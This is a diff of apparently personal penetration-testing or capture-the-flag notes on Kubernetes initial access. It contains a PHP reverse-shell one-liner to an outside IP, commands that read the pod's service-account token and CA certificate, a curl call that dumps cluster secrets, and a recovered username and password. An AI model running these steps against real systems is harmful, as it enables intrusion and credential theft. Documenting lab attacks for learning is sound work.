@@ -60,6 +60,8 @@ php -r '$sock=fsockopen("10.10.16.33",5555);shell_exec("sh <&3 >&3 2>&3");'
 
 
 ![[IMG-20260119004711181.png]]
+Source: https://red.infiltr8.io/cloud-cicd-pentesting/kubernetes/initial-access
+![[IMG-20260119151437476.png]]
 
 ```
 cat /var/run/secrets/kubernetes.io/serviceaccount/token
@@ -67,9 +69,48 @@ eyJhbGciOiJSUzI1NiIsImtpZCI6Inp3THEyYUhkb19sV3VBcGFfdTBQa1c1S041TkNiRXpYRS11S0Jq
 ```
 
 ```
+cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
+default
+```
+
+```
+cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
+-----BEGIN CERTIFICATE-----
+MIIBdzCCAR2gAwIBAgIBADAKBggqhkjOPQQDAjAjMSEwHwYDVQQDDBhrM3Mtc2Vy
+dmVyLWNhQDE3MjY5Mjc3MjMwHhcNMjQwOTIxMTQwODQzWhcNMzQwOTE5MTQwODQz
+WjAjMSEwHwYDVQQDDBhrM3Mtc2VydmVyLWNhQDE3MjY5Mjc3MjMwWTATBgcqhkjO
+PQIBBggqhkjOPQMBBwNCAATWYWOnIUmDn8DGHOdKLjrOZ36gSUMVrnqqf6YJsvpk
+9QbgzGNFzYcwDZxmZtJayTbUrFFjgSydDNGuW/AkEnQ+o0IwQDAOBgNVHQ8BAf8E
+BAMCAqQwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQUtCpVDbK3XnBv3N3BKuXy
+Yd0zeicwCgYIKoZIzj0EAwIDSAAwRQIgOsFo4UipeXPiEXvlGH06fja8k46ytB45
+cd0d39uShuQCIQDMgaSW8nrpMfNExuGLMZhcsVrUr5XXN8F5b/zYi5snkQ==
+-----END CERTIFICATE-----
+```
+
+
+env:
+```
 KUBERNETES_SERVICE_HOST=10.43.0.1
 KUBERNETES_PORT=tcp://10.43.0.1:443
 ```
 
-![[IMG-20260119144347787.png]]
+
+![[IMG-20260119152133309.png]]
+
+```
+curl -s --cacert "$CACERT" \
+  -H "Authorization: Bearer $TOKEN" \
+  https://10.43.0.1:443/api/v1/namespaces/$NAMESPACE/secrets | jq
+```
+
+![[IMG-20260119152209219.png]]
+
+![[IMG-20260119152253537.png]]
+
+```
+user:babywyrm
+password:dM08s53fGixFOWpM2RBVGmZ8gFspg3d
+```
+
+![[IMG-20260119152347328.png]]
 
